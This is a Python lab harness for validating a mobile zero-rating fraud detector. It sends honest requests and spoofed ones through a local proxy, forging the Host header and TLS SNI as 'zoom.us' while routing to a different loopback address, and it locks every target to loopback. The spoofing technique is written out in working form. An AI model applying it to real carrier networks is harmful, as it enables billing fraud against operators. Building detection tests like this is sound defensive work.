# =============================================================================
#  LAB / EDUCATIONAL — defensive fraud detection reference model.
#  Do not use against networks you do not own.
# =============================================================================
#
#  ###########################################################################
#  ##                                                                       ##
#  ##   READ THIS BEFORE RUNNING                                            ##
#  ##                                                                       ##
#  ##   This script exists for ONE purpose: to validate that detector.py    ##
#  ##   actually catches what it claims to catch, inside a closed local     ##
#  ##   lab, on hardware you own.                                           ##
#  ##                                                                       ##
#  ##   It is NOT a tool for obtaining free data. Running anything like it  ##
#  ##   against a real mobile network is billing fraud: it is a criminal    ##
#  ##   offence in most jurisdictions, a breach of every operator's terms   ##
#  ##   of service, and it steals from a company that has not consented to  ##
#  ##   being tested. Do not do it.                                         ##
#  ##                                                                       ##
#  ##   The script enforces this technically as well as by policy: every    ##
#  ##   target is hard-checked against 127.0.0.0/8 before a socket is       ##
#  ##   opened, and it refuses to run otherwise (see assert_loopback).      ##
#  ##   There is no flag to disable that check.                             ##
#  ##                                                                       ##
#  ###########################################################################
#
#  WHAT IT DOES
#  ------------
#  Drives five scenarios through the local proxy so the naive-vs-detector
#  contrast can be observed side by side:
#
#    1. legit-charged      HTTP  Host: lab-origin.local  -> 127.0.0.1   honest, billable
#    2. legit-zerorated    HTTP  Host: zoom.us           -> 127.0.0.2   honest, free
#    3. spoof-http         HTTP  Host: zoom.us           -> 127.0.0.1   LIE (Host spoof)
#    4. legit-zerorated-tls TLS  SNI:  zoom.us           -> 127.0.0.2   honest, free
#    5. spoof-tls          TLS   SNI:  zoom.us           -> 127.0.0.1   LIE (SNI spoof)
#
#  Scenarios 3 and 5 are the attack. Against classifier_naive.py they are
#  waived as free traffic. Against detector.py they are dropped.
#
#  HOW THE SPOOF IS CONSTRUCTED
#  ----------------------------
#  Nothing exotic — that is the point. The claimed identity and the actual
#  destination are simply two different fields, and only one of them is
#  checked by a naive classifier:
#
#    plaintext : send an absolute-URI request line to the proxy pointing at
#                127.0.0.1, but put "Host: zoom.us" in the headers.
#    TLS       : CONNECT to 127.0.0.1:8443, then set the TLS SNI extension to
#                "zoom.us" via ssl's server_hostname parameter.
#
#  Raw sockets are used rather than requests/urllib because those libraries
#  derive the Host header and SNI from the URL, which is exactly the coupling
#  an attacker breaks.
# =============================================================================

from __future__ import annotations

import argparse
import ipaddress
import socket
import ssl
import sys
from dataclasses import dataclass
from pathlib import Path

import lab_config as cfg
from logging_util import JsonLinesLogger

# append=True: the harness runs twice per demo (naive phase, detector phase)
# and both sets of results must survive in one evidence file. run_demo clears
# logs/ at the start of a run.
LOG = JsonLinesLogger("attacker_client", "attacker_client.jsonl", append=True)

CONNECT_TIMEOUT = 10.0
READ_TIMEOUT = 15.0


# ---------------------------------------------------------------------------
# Hard safety interlock
# ---------------------------------------------------------------------------
class UnsafeTargetError(RuntimeError):
    """Raised when a target is not a loopback address."""


class ProxyUnavailableError(RuntimeError):
    """Raised when the proxy itself could not be reached.

    Kept distinct from a mid-flow teardown on purpose. "The proxy refused my
    connection" and "the proxy accepted my connection and then dropped the
    flow" look similar from the client side, but they mean opposite things:
    the first is a broken lab, the second is the detector working. Collapsing
    them would let a demo report a successful detection when in fact nothing
    was ever listening.
    """


def assert_loopback(host: str, context: str) -> None:
    """Refuse to open a socket to anything outside 127.0.0.0/8 or ::1.

    This is a deliberate, non-overridable interlock. There is no command-line
    switch to bypass it. If you find yourself wanting to remove it, stop: the
    thing you are about to do is not this lab.
    """
    try:
        addr = ipaddress.ip_address(host)
    except ValueError as exc:
        raise UnsafeTargetError(
            f"{context}: target '{host}' is not a literal IP address. "
            "This lab only ever connects to loopback IPs."
        ) from exc
    if not addr.is_loopback:
        raise UnsafeTargetError(
            f"{context}: target '{host}' is not a loopback address. Refusing. "
            "This harness must never be pointed at a real network."
        )


# ---------------------------------------------------------------------------
# Scenario definition
# ---------------------------------------------------------------------------
@dataclass
class Scenario:
    name: str
    description: str
    claimed_host: str  # what we tell the classifier (Host header / SNI)
    real_ip: str  # where the packets actually go
    port: int
    tls: bool
    honest: bool  # True = claimed host genuinely lives at real_ip
    path: str = "/content"

    @property
    def expected_naive(self) -> str:
        return "ZERO-RATED" if cfg.is_zero_rated(self.claimed_host) else "CHARGED"

    @property
    def expected_detector(self) -> str:
        if not cfg.is_zero_rated(self.claimed_host):
            return "CHARGED"
        return "ZERO-RATED" if self.honest else "DROPPED"


SCENARIOS: list[Scenario] = [
    Scenario(
        name="legit-charged",
        description="Ordinary web content, honestly labelled. Should be billed.",
        claimed_host="lab-origin.local",
        real_ip=cfg.ORIGIN_CHARGED_IP,
        port=cfg.ORIGIN_HTTP_PORT,
        tls=False,
        honest=True,
    ),
    Scenario(
        name="legit-zerorated",
        description="Genuine zero-rated service over plaintext. Should be free.",
        claimed_host="zoom.us",
        real_ip=cfg.ORIGIN_ZERO_RATED_IP,
        port=cfg.ORIGIN_HTTP_PORT,
        tls=False,
        honest=True,
        path="/meeting",
    ),
    Scenario(
        name="spoof-http",
        description="ATTACK: Host header claims zoom.us, packets go elsewhere.",
        claimed_host="zoom.us",
        real_ip=cfg.ORIGIN_CHARGED_IP,
        port=cfg.ORIGIN_HTTP_PORT,
        tls=False,
        honest=False,
    ),
    Scenario(
        name="legit-zerorated-tls",
        description="Genuine zero-rated service over TLS. Should be free.",
        claimed_host="zoom.us",
        real_ip=cfg.ORIGIN_ZERO_RATED_IP,
        port=cfg.ORIGIN_HTTPS_PORT,
        tls=True,
        honest=True,
        path="/meeting",
    ),
    Scenario(
        name="spoof-tls",
        description="ATTACK: TLS SNI claims zoom.us, packets go elsewhere.",
        claimed_host="zoom.us",
        real_ip=cfg.ORIGIN_CHARGED_IP,
        port=cfg.ORIGIN_HTTPS_PORT,
        tls=True,
        honest=False,
    ),
]


# ---------------------------------------------------------------------------
# Transport helpers
# ---------------------------------------------------------------------------
def _read_all(sock: socket.socket | ssl.SSLSocket) -> bytes:
    """Read until the peer closes or the declared Content-Length is satisfied."""
    chunks: list[bytes] = []
    total = 0
    expected: int | None = None
    header_end = -1
    while True:
        try:
            chunk = sock.recv(65536)
        except (ConnectionResetError, ssl.SSLError, socket.timeout, OSError):
            break
        if not chunk:
            break
        chunks.append(chunk)
        total += len(chunk)

        if expected is None:
            blob = b"".join(chunks)
            header_end = blob.find(b"\r\n\r\n")
            if header_end != -1:
                head = blob[:header_end].decode("latin-1").lower()
                for line in head.split("\r\n"):
                    if line.startswith("content-length:"):
                        try:
                            expected = int(line.split(":", 1)[1].strip())
                        except ValueError:
                            expected = None
                        break
        if expected is not None and header_end != -1:
            if total - (header_end + 4) >= expected:
                break
    return b"".join(chunks)


def _proxy_socket() -> socket.socket:
    assert_loopback(cfg.PROXY_HOST, "proxy")
    try:
        sock = socket.create_connection(
            (cfg.PROXY_HOST, cfg.PROXY_PORT), timeout=CONNECT_TIMEOUT
        )
    except OSError as exc:
        raise ProxyUnavailableError(
            f"could not reach the lab proxy at {cfg.PROXY_HOST}:{cfg.PROXY_PORT} "
            f"({type(exc).__name__}: {exc}). Is mitmdump running with an addon "
            f"loaded? This is a lab setup failure, NOT a detection."
        ) from exc
    sock.settimeout(READ_TIMEOUT)
    return sock


def _mitm_ca_context() -> ssl.SSLContext:
    """TLS context for talking through the intercepting proxy.

    Prefers the mitmproxy CA if it exists (the realistic case: the "device"
    trusts the operator's inspection CA). Falls back to no verification,
    because what this lab is exercising is the CLASSIFIER, not the PKI — and
    the lab origin's own certificate is self-signed anyway.
    """
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ca = Path.home() / ".mitmproxy" / "mitmproxy-ca-cert.pem"
    if ca.exists():
        try:
            ctx.load_verify_locations(cafile=str(ca))
            # Hostname check stays OFF on purpose: we intentionally present an
            # SNI that does not correspond to the destination. Verifying it
            # would defeat the very scenario under test.
            ctx.check_hostname = False
            return ctx
        except ssl.SSLError:
            pass
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


# ---------------------------------------------------------------------------
# Scenario execution
# ---------------------------------------------------------------------------
def run_http(scn: Scenario) -> dict:
    """Plaintext case: absolute-URI request line + a chosen Host header."""
    assert_loopback(scn.real_ip, f"scenario {scn.name}")

    url = f"http://{scn.real_ip}:{scn.port}{scn.path}"
    request = (
        # The request LINE carries the true destination (the proxy routes on
        # this). The Host HEADER carries whatever we want the classifier to
        # believe. A naive classifier reads the header.
        f"GET {url} HTTP/1.1\r\n"
        f"Host: {scn.claimed_host}\r\n"
        f"User-Agent: zrlab-attacker-client/1.0 (local lab only)\r\n"
        f"Accept: */*\r\n"
        f"Connection: close\r\n"
        f"\r\n"
    ).encode("ascii")

    sock = _proxy_socket()
    try:
        sock.sendall(request)
        raw = _read_all(sock)
    finally:
        sock.close()
    return _summarise(scn, raw)


def run_tls(scn: Scenario) -> dict:
    """TLS case: CONNECT to the real IP, then set SNI to the claimed host."""
    assert_loopback(scn.real_ip, f"scenario {scn.name}")

    sock = _proxy_socket()
    try:
        # Step 1: ask the proxy for a tunnel to the REAL destination.
        connect = (
            f"CONNECT {scn.real_ip}:{scn.port} HTTP/1.1\r\n"
            f"Host: {scn.real_ip}:{scn.port}\r\n"
            f"\r\n"
        ).encode("ascii")
        sock.sendall(connect)

        # Read just the CONNECT response headers.
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
        status = buf.split(b"\r\n", 1)[0].decode("latin-1", "replace") if buf else ""
        if b" 200 " not in buf.split(b"\r\n", 1)[0]:
            return {
                "outcome": "TUNNEL_REFUSED",
                "status_line": status,
                "bytes_received": len(buf),
            }

        # Step 2: TLS handshake with a SPOOFABLE SNI. `server_hostname` is
        # what lands in the ClientHello's server_name extension — the exact
        # field an operator classifier keys on for encrypted traffic.
        ctx = _mitm_ca_context()
        tls_sock = ctx.wrap_socket(sock, server_hostname=scn.claimed_host)
        try:
            request = (
                f"GET {scn.path} HTTP/1.1\r\n"
                f"Host: {scn.claimed_host}\r\n"
                f"User-Agent: zrlab-attacker-client/1.0 (local lab only)\r\n"
                f"Accept: */*\r\n"
                f"Connection: close\r\n"
                f"\r\n"
            ).encode("ascii")
            tls_sock.sendall(request)
            raw = _read_all(tls_sock)
        finally:
            try:
                tls_sock.close()
            except OSError:
                pass
        return _summarise(scn, raw)
    finally:
        try:
            sock.close()
        except OSError:
            pass


def _summarise(scn: Scenario, raw: bytes) -> dict:
    """Turn a raw response into an outcome the demo can print."""
    if not raw:
        # No bytes at all: the enforcement point tore the flow down.
        return {"outcome": "DROPPED", "status_line": "", "bytes_received": 0}
    head, _, body = raw.partition(b"\r\n\r\n")
    status_line = head.split(b"\r\n", 1)[0].decode("latin-1", "replace")
    outcome = "SERVED"
    if " 403 " in status_line:
        outcome = "BLOCKED_403"
    return {
        "outcome": outcome,
        "status_line": status_line,
        "bytes_received": len(raw),
        "body_bytes": len(body),
    }


def run_scenario(scn: Scenario, phase: str) -> dict:
    LOG.info(
        "scenario_start",
        scenario=scn.name,
        phase=phase,
        description=scn.description,
        claimed_host=scn.claimed_host,
        real_destination=f"{scn.real_ip}:{scn.port}",
        transport="TLS/SNI" if scn.tls else "HTTP/Host",
        honest=scn.honest,
    )
    try:
        result = run_tls(scn) if scn.tls else run_http(scn)
    except UnsafeTargetError as exc:
        LOG.error("scenario_refused", scenario=scn.name, error=str(exc))
        return {"outcome": "REFUSED_UNSAFE_TARGET", "error": str(exc)}
    except ProxyUnavailableError as exc:
        # Explicitly NOT reported as DROPPED - see ProxyUnavailableError.
        LOG.error(
            "scenario_proxy_unavailable",
            scenario=scn.name,
            phase=phase,
            error=str(exc),
            interpretation="lab setup failure - no classification took place",
        )
        return {"outcome": "PROXY_UNAVAILABLE", "error": str(exc)}
    except (ConnectionResetError, ssl.SSLError, socket.timeout, OSError) as exc:
        # A reset mid-handshake or mid-body is what a PCEF gate-close looks
        # like from the client side. That is a SUCCESSFUL detection, not a bug.
        LOG.info(
            "scenario_connection_torn_down",
            scenario=scn.name,
            phase=phase,
            error_type=type(exc).__name__,
            interpretation="consistent with enforcement dropping the flow",
        )
        result = {"outcome": "DROPPED", "status_line": "", "bytes_received": 0}

    expected = scn.expected_naive if phase == "naive" else scn.expected_detector
    LOG.info(
        "scenario_result",
        scenario=scn.name,
        phase=phase,
        claimed_host=scn.claimed_host,
        real_destination=f"{scn.real_ip}:{scn.port}",
        expected_charging_outcome=expected,
        **result,
    )
    return result


def send_shutdown() -> None:
    """Ask the running addon to stop gracefully so it flushes its final report."""
    try:
        sock = _proxy_socket()
    except (ProxyUnavailableError, OSError) as exc:
        LOG.warn("shutdown_request_failed", error=str(exc))
        return
    try:
        req = (
            f"GET http://{cfg.CONTROL_HOST}/shutdown HTTP/1.1\r\n"
            f"Host: {cfg.CONTROL_HOST}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode("ascii")
        sock.sendall(req)
        _read_all(sock)
        LOG.info("shutdown_request_sent", target=cfg.CONTROL_HOST)
    except OSError as exc:
        LOG.warn("shutdown_request_failed", error=str(exc))
    finally:
        sock.close()


def main() -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Zero-rating bypass test harness — LOCAL LAB ONLY. Generates "
            "legitimate and spoofed requests against the loopback lab origin "
            "so detector.py can be validated."
        )
    )
    parser.add_argument(
        "--phase",
        choices=["naive", "detector"],
        default="naive",
        help="Which addon is currently in front of the origin (labels the logs).",
    )
    parser.add_argument(
        "--only",
        help="Run a single scenario by name.",
        choices=[s.name for s in SCENARIOS],
    )
    parser.add_argument(
        "--skip-tls",
        action="store_true",
        help="Run only the plaintext scenarios.",
    )
    parser.add_argument(
        "--shutdown-proxy",
        action="store_true",
        help="After the scenarios, ask the addon to stop and flush its report.",
    )
    args = parser.parse_args()

    LOG.info(
        "harness_started",
        phase=args.phase,
        proxy=f"{cfg.PROXY_HOST}:{cfg.PROXY_PORT}",
        scope="loopback targets only - hard-enforced by assert_loopback()",
        banner="LAB / EDUCATIONAL - never run this against a network you do not own",
    )

    selected = [s for s in SCENARIOS if not args.only or s.name == args.only]
    if args.skip_tls:
        selected = [s for s in selected if not s.tls]

    for scn in selected:
        run_scenario(scn, args.phase)

    if args.shutdown_proxy:
        send_shutdown()

    LOG.info("harness_finished", phase=args.phase, scenarios_run=len(selected))
    LOG.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
